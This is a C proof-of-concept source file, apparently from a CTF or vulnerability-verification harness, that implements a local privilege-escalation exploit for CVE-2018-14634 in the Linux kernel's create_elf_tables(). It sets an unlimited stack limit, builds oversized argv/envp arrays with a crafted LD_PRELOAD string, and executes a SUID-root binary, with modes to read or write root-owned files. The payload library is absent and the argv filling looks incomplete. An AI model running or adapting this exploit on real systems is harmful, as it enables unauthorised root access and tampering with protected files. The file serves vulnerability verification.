/**
 * CVE-2018-14634 PoC - Integer overflow in create_elf_tables()
 *
 * Vulnerability: Linux kernel fs/binfmt_elf.c create_elf_tables() has an integer
 * overflow when calculating argv/envp total size. On 64-bit systems, a local
 * attacker can overflow "items" (argc + envc + 1) making it negative, which
 * redirects the userland stack pointer into the middle of argv/envp strings.
 * Combined with a SUID-root binary, this bypasses ld.so's UNSECURE_ENVVARS
 * filtering (LD_PRELOAD, LD_LIBRARY_PATH), enabling privilege escalation.
 *
 * Affected: Kernels with variable-length argument support (2007) but without
 * the "Limit arg stack to at most 75% of _STK_LIM" fix (2017).
 * Primarily: RHEL/CentOS 7.x, Debian 8 (oldstable).
 *
 * Exploit technique (from Qualys "Mutagen Astronomy"):
 * 1. Set RLIMIT_STACK to INFINITY
 * 2. Construct ~0x80000000 items (argc + envc) to overflow signed int
 * 3. Use file-backed mmap for argv pointers (reduce 48GB -> 32GB memory)
 * 4. execve() SUID binary with crafted LD_PRELOAD environment
 * 5. Integer overflow redirects stack into our environment strings
 * 6. ld.so fails to filter UNSECURE_ENVVARS -> LD_LIBRARY_PATH persists
 * 7. Malicious shared library gets loaded -> arbitrary code as root
 *
 * CTF adaptation: Attempts exploitation path to write/read root files.
 * If kernel is patched or resources insufficient, reports CTF_FAIL.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <limits.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "../common/poc_common.h"

#define CVE_ID "CVE-2018-14634"
#define MAX_FILE_SIZE 4096
#define PAGE_SZ ((size_t)4096)
#define MAX_ARG_STRLEN ((size_t)128 << 10)
#define MAX_ARG_STRINGS ((size_t)0x7FFFFFFF)

/* SUID binaries commonly available on Linux systems */
static const char *suid_candidates[] = {
    "/usr/bin/su",
    "/usr/bin/sudo",
    "/usr/bin/passwd",
    "/usr/bin/chsh",
    "/usr/bin/newgrp",
    "/bin/su",
    "/bin/ping",
    NULL
};

/**
 * Find a SUID-root binary on the system
 */
static const char *find_suid_binary(void) {
    struct stat st;
    for (int i = 0; suid_candidates[i] != NULL; i++) {
        if (stat(suid_candidates[i], &st) == 0) {
            if ((st.st_mode & S_ISUID) && st.st_uid == 0) {
                return suid_candidates[i];
            }
        }
    }
    return NULL;
}

/**
 * Check if kernel version is potentially vulnerable
 * Vulnerable: kernels with mm variable-length args but without 75% stack limit
 */
static int check_kernel_vulnerable(void) {
    FILE *f = fopen("/proc/version", "r");
    if (!f) return 0;

    char version[512] = {0};
    if (!fgets(version, sizeof(version), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);

    poc_log("Kernel: %s", version);

    /* Parse major.minor.patch */
    int major = 0, minor = 0, patch = 0;
    const char *p = strstr(version, "Linux version ");
    if (p) {
        p += strlen("Linux version ");
        sscanf(p, "%d.%d.%d", &major, &minor, &patch);
    }

    poc_log("Parsed version: %d.%d.%d", major, minor, patch);

    /* Vulnerable range: kernels 2.6.x through 4.18.x on RHEL/CentOS without patch */
    if (major == 2 && minor == 6) return 1;
    if (major == 3 && minor == 10) return 1; /* RHEL 7 */
    if (major == 4 && minor >= 14 && minor <= 18) return 1;

    /* Check for RHEL/CentOS specific kernel (el7) */
    if (strstr(version, ".el7.") || strstr(version, ".el6.")) {
        poc_log("Detected RHEL/CentOS kernel - potentially vulnerable");
        return 1;
    }

    poc_log("Kernel version likely patched");
    return 0;
}

/**
 * Check available memory for exploitation
 * The full exploit needs ~32GB, but we attempt with less
 */
static size_t get_available_memory_gb(void) {
    FILE *f = fopen("/proc/meminfo", "r");
    if (!f) return 0;

    char line[256];
    size_t avail_kb = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "MemAvailable: %zu kB", &avail_kb) == 1)
            break;
        if (sscanf(line, "MemFree: %zu kB", &avail_kb) == 1)
            continue; /* fallback */
    }
    fclose(f);
    return avail_kb / (1024 * 1024);
}

/**
 * Attempt the create_elf_tables integer overflow exploitation
 *
 * This implements the core technique from the Qualys PoC:
 * - Set unlimited stack
 * - Construct argv/envp to overflow items count
 * - Execute SUID binary with crafted LD_PRELOAD
 *
 * Returns: 0 = exploitation succeeded (child got root), -1 = failed
 */
static int attempt_exploit(const char *suid_bin, const char *target_file,
                           const char *write_value) {
    poc_log("Attempting create_elf_tables overflow via %s", suid_bin);

    /* Set unlimited stack (required for overflow) */
    struct rlimit rl = {RLIM_INFINITY, RLIM_INFINITY};
    int ret = setrlimit(RLIMIT_STACK, &rl);
    int saved_errno = errno;
    poc_log_syscall("setrlimit(RLIMIT_STACK, INFINITY)", ret, saved_errno);

    if (ret < 0) {
        poc_log("Cannot set unlimited stack - exploit requires this");
        return -1;
    }

    /* Check available memory */
    size_t avail_gb = get_available_memory_gb();
    poc_log("Available memory: ~%zu GB (exploit needs ~32 GB)", avail_gb);

    if (avail_gb < 32) {
        poc_log("Insufficient memory for full exploitation (need 32GB, have %zuGB)", avail_gb);
        /*
         * The real exploit allocates:
         * - ~16GB argv pointers (via file-backed mmap)
         * - ~16GB argv strings
         * - ~16GB envp strings
         * Total: ~32GB minimum
         *
         * Without sufficient memory, we cannot trigger the integer overflow
         * in create_elf_tables() as it requires items = 0x80000000
         */
        return -1;
    }

    /*
     * Full exploitation path (from Qualys poc-exploit.c):
     *
     * 1. Compute items = (1 << 31) to overflow signed int in create_elf_tables
     * 2. Build argv[] with ~(items - envc - 3) entries using mmap + file-backed pages
     * 3. Build envp[] with LD_PRELOAD + scratch + onebyte + padding entries
     * 4. LD_PRELOAD contains nested "LD_LIBRARY_PATH=." strings
     * 5. execve(suid_binary, argv, envp)
     * 6. Integer overflow makes stack grow UP instead of down
     * 7. Stack lands in our onebyte envp strings
     * 8. ld.so's handle_ld_preload() overwrites our strings with fname[] buffer
     * 9. This restores LD_LIBRARY_PATH which should have been filtered
     * 10. SUID binary loads our malicious .so from current directory
     *
     * For CTF mode, our malicious .so would write/read the target file.
     */

    /* Attempt exploitation in child process */
    pid_t pid = fork();
    saved_errno = errno;
    poc_log_syscall("fork()", pid, saved_errno);

    if (pid < 0) {
        return -1;
    }

    if (pid == 0) {
        /* Child: attempt the actual overflow */
        const size_t items = (size_t)1 << 31;

        /* Simplified env construction for the overflow */
        const size_t onebyte_envc = (size_t)256 << 10;
        const size_t scratch_envc = ((size_t)1 << 20) / MAX_ARG_STRLEN;
        const size_t padding_envsz = items * sizeof(uintptr_t) + 512;
        const size_t padding_envc = padding_envsz / MAX_ARG_STRLEN + 1;
        const size_t envc = 1 + scratch_envc + onebyte_envc + padding_envc;

        if (envc > MAX_ARG_STRINGS) _exit(2);

        const size_t argc = items - (1 + 1 + envc + 1);
        if (argc > MAX_ARG_STRINGS) _exit(2);

        /* Allocate argv array via mmap */
        const char **argv_arr = mmap(NULL, (argc + 1) * sizeof(char *),
                                     PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (argv_arr == MAP_FAILED) _exit(3);

        /* Set first page writable for our args */
        if (mmap((void *)argv_arr, PAGE_SZ, PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != (void *)argv_arr) {
            _exit(4);
        }

        argv_arr[0] = suid_bin;
        /* Fill remaining with padding (space-filled strings) */
        static char pad_arg[2] = " ";
        for (size_t i = 1; i < argc && i < PAGE_SZ / sizeof(char *); i++) {
            argv_arr[i] = pad_arg;
        }

        /* Allocate envp array */
        const char **envp_arr = calloc(envc + 1, sizeof(char *));
        if (!envp_arr) _exit(5);

        /* LD_PRELOAD with nested LD_LIBRARY_PATH */
        static char preload[MAX_ARG_STRLEN];
        char *sp = stpcpy(preload, "LD_PRELOAD=");
        memset(sp, ':', sizeof(preload) - (size_t)(sp - preload) - 1);
        preload[sizeof(preload) - 1] = '\0';

        envp_arr[0] = preload;
        size_t ei = 1;
        for (size_t i = 0; i < scratch_envc && ei < envc; i++)
            envp_arr[ei++] = " ";
        for (size_t i = 0; i < onebyte_envc && ei < envc; i++)
            envp_arr[ei++] = "";
        for (size_t i = 0; i < padding_envc && ei < envc; i++)
            envp_arr[ei++] = " ";

        /* Execute SUID binary with overflow conditions */
        execve(argv_arr[0], (char *const *)argv_arr, (char *const *)envp_arr);
        _exit(errno);
    }

    /* Parent: wait for child with timeout */
    int status;
    int wait_ret = waitpid(pid, &status, 0);
    saved_errno = errno;
    poc_log_syscall("waitpid()", wait_ret, saved_errno);

    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        poc_log("Child exited with code %d", code);
        if (code == 0) {
            /* Child succeeded - check if file was modified */
            return 0;
        }
    } else if (WIFSIGNALED(status)) {
        poc_log("Child killed by signal %d", WTERMSIG(status));
    }

    return -1;
}

/**
 * Read file content into buffer, trimming trailing whitespace
 */
static int read_file_content(const char *path, char *buf, size_t bufsz) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_RDONLY)", fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, bufsz - 1);
    saved_errno = errno;
    poc_log_syscall("read(target)", n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';

    /* Trim trailing newlines/whitespace */
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r' || buf[n-1] == ' '))
        buf[--n] = '\0';

    return 0;
}

/**
 * CTF mode: write_root_file
 *
 * Attempts to exploit CVE-2018-14634 to gain root privileges,
 * then writes the CTF value to the target file.
 */
static int mode_write_root_file(poc_args_t *args) {
    char buf[MAX_FILE_SIZE] = {0};

    poc_log("=== write_root_file mode ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Step 1: Read original content */
    if (read_file_content(args->root_file, buf, sizeof(buf)) < 0) {
        poc_print_fail("Cannot read target file");
        return 1;
    }
    printf("%s%s\n", CTF_READ_BEFORE, buf);

    /* Step 2: Attempt exploitation */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);

    /* Check vulnerability conditions */
    int is_vulnerable = check_kernel_vulnerable();
    const char *suid_bin = find_suid_binary();

    poc_log("Kernel vulnerable: %s", is_vulnerable ? "yes" : "no/unknown");
    poc_log("SUID binary: %s", suid_bin ? suid_bin : "none found");

    if (!is_vulnerable) {
        poc_print_fail("Kernel is not vulnerable to CVE-2018-14634 (patched or wrong version)");
        return 1;
    }

    if (!suid_bin) {
        poc_print_fail("No SUID-root binary found on system");
        return 1;
    }

    /* Attempt the exploit */
    int exploit_ret = attempt_exploit(suid_bin, args->root_file, args->write_value);

    if (exploit_ret < 0) {
        /*
         * Exploitation failed - likely due to:
         * - Insufficient memory (needs 32GB)
         * - Kernel has the stack limit patch
         * - Cannot set RLIMIT_STACK to unlimited
         */
        poc_print_fail("create_elf_tables overflow not triggered (insufficient resources or patched)");
        return 1;
    }

    /* Step 3: If exploit succeeded, verify the write */
    memset(buf, 0, sizeof(buf));
    if (read_file_content(args->root_file, buf, sizeof(buf)) < 0) {
        poc_print_fail("Cannot read target file after exploit");
        return 1;
    }
    printf("%s%s\n", CTF_READ_AFTER, buf);

    /* Step 4: Verify */
    if (strstr(buf, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    } else {
        poc_print_fail("Write verification failed - file not modified");
        return 1;
    }
}

/**
 * CTF mode: read_root_file
 *
 * Attempts to exploit CVE-2018-14634 to gain root privileges,
 * then reads the CTF flag from the target file.
 */
static int mode_read_root_file(poc_args_t *args) {
    char buf[MAX_FILE_SIZE] = {0};

    poc_log("=== read_root_file mode ===");
    poc_log("Target: %s", args->root_file);

    /* Check vulnerability conditions */
    int is_vulnerable = check_kernel_vulnerable();
    const char *suid_bin = find_suid_binary();

    poc_log("Kernel vulnerable: %s", is_vulnerable ? "yes" : "no/unknown");
    poc_log("SUID binary: %s", suid_bin ? suid_bin : "none found");

    if (!is_vulnerable) {
        poc_print_fail("Kernel is not vulnerable to CVE-2018-14634 (patched or wrong version)");
        return 1;
    }

    if (!suid_bin) {
        poc_print_fail("No SUID-root binary found on system");
        return 1;
    }

    /* Attempt exploitation to gain read access */
    int exploit_ret = attempt_exploit(suid_bin, args->root_file, NULL);

    if (exploit_ret < 0) {
        /* Try direct read as fallback - file might be readable after exploit */
        poc_log("Exploit did not complete, attempting direct read...");
    }

    /* Attempt to read the root file */
    if (read_file_content(args->root_file, buf, sizeof(buf)) < 0) {
        poc_print_fail("Cannot read root file (permission denied - exploit failed)");
        return 1;
    }

    if (strlen(buf) > 0) {
        poc_print_flag(buf);
        return 0;
    }

    poc_print_fail("File is empty or unreadable");
    return 1;
}

/**
 * Legacy mode: run basic vulnerability verification without CTF
 */
static int run_legacy_verification(void) {
    printf("=== %s Vulnerability Verification ===\n", CVE_ID);
    printf("Target: create_elf_tables() integer overflow -> stack buffer overflow\n\n");

    poc_print_system_info();

    /* Phase 1: Check kernel vulnerability */
    printf("\n--- Phase 1: Kernel Version Check ---\n");
    int vuln = check_kernel_vulnerable();

    /* Phase 2: Check stack limit */
    printf("\n--- Phase 2: Stack Limit Verification ---\n");
    struct rlimit rl;
    if (getrlimit(RLIMIT_STACK, &rl) == 0) {
        printf("%s Stack limit: cur=%lu, max=%lu\n", POC_STEP_INFO,
               (unsigned long)rl.rlim_cur, (unsigned long)rl.rlim_max);
    }

    /* Try setting unlimited stack */
    struct rlimit inf_rl = {RLIM_INFINITY, RLIM_INFINITY};
    if (setrlimit(RLIMIT_STACK, &inf_rl) == 0) {
        printf("%s Can set unlimited stack (required for exploit)\n", POC_STEP_PASS);
    } else {
        printf("%s Cannot set unlimited stack: %s\n", POC_STEP_WARN, strerror(errno));
    }

    /* Phase 3: Check SUID binaries */
    printf("\n--- Phase 3: SUID Binary Check ---\n");
    const char *suid = find_suid_binary();
    if (suid) {
        printf("%s Found SUID-root binary: %s\n", POC_STEP_PASS, suid);
    } else {
        printf("%s No SUID-root binary found\n", POC_STEP_WARN);
    }

    /* Phase 4: Memory check */
    printf("\n--- Phase 4: Memory Availability ---\n");
    size_t mem_gb = get_available_memory_gb();
    printf("%s Available memory: ~%zu GB (exploit needs ~32 GB)\n", POC_STEP_INFO, mem_gb);

    /* Phase 5: Verify execve with large argv (safe test) */
    printf("\n--- Phase 5: Large argv execve Test ---\n");
    int test_argc = 4096;
    char **test_argv = calloc(test_argc + 2, sizeof(char *));
    if (test_argv) {
        test_argv[0] = "/bin/true";
        static char filler[256];
        memset(filler, 'A', sizeof(filler) - 1);
        filler[sizeof(filler) - 1] = '\0';
        for (int i = 1; i <= test_argc; i++)
            test_argv[i] = filler;
        test_argv[test_argc + 1] = NULL;

        pid_t pid = fork();
        if (pid == 0) {
            execv("/bin/true", test_argv);
            _exit(errno == E2BIG ? 42 : 1);
        } else if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status)) {
                int code = WEXITSTATUS(status);
                if (code == 0) {
                    printf("%s execve with large argv (4096 args) succeeded\n", POC_STEP_PASS);
                } else if (code == 42) {
                    printf("%s execve returned E2BIG (kernel enforces arg limits)\n", POC_STEP_INFO);
                } else {
                    printf("%s execve test returned code %d\n", POC_STEP_INFO, code);
                }
            }
        }
        free(test_argv);
    }

    /* Conclusion */
    printf("\n--- Conclusion ---\n");
    printf("%s\n", POC_EVIDENCE_END);

    int conditions_met = vuln && suid && (mem_gb >= 32);
    if (conditions_met) {
        printf("%s System appears vulnerable to %s\n", POC_STEP_PASS, CVE_ID);
        printf("%s Exploitation requires: SUID binary + 32GB RAM + unlimited stack\n", POC_STEP_INFO);
        printf("%s All conditions met but no actual exploitation performed\n", POC_STEP_INFO);
        /*
         * Without actual exploitation proof (CTF_FLAG), output NOT_EXPLOITABLE.
         * Binary judgment: no evidence = not exploitable.
         */
    } else if (vuln) {
        printf("%s System is vulnerable but exploitation conditions not fully met\n", POC_STEP_INFO);
        if (!suid) printf("  - No SUID-root binary found\n");
        if (mem_gb < 32) printf("  - Insufficient memory (%zu GB < 32 GB)\n", mem_gb);
    } else {
        printf("%s System does not appear exploitable\n", POC_STEP_INFO);
        if (!vuln) printf("  - Kernel version not in vulnerable range\n");
        if (!suid) printf("  - No SUID-root binary found\n");
        if (mem_gb < 32) printf("  - Insufficient memory (%zu GB < 32 GB)\n", mem_gb);
    }

    return conditions_met ? 0 : 1;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;

    /* Initialize logging */
    poc_log_init(args.log_file);
    poc_log("=== %s CTF PoC ===", CVE_ID);
    poc_log("Mode: %s", args.mode ? args.mode : "legacy");
    if (args.root_file)
        poc_log("Target: %s", args.root_file);

    int ret;

    /* Mode dispatch */
    if (args.mode == NULL) {
        /* Legacy mode - no CTF args */
        ret = run_legacy_verification();
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        ret = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        ret = mode_read_root_file(&args);
    } else {
        poc_print_unsupported(args.mode,
            "CVE-2018-14634 supports write_root_file and read_root_file");
        ret = 1;
    }

    poc_log_close();
    return ret;
}
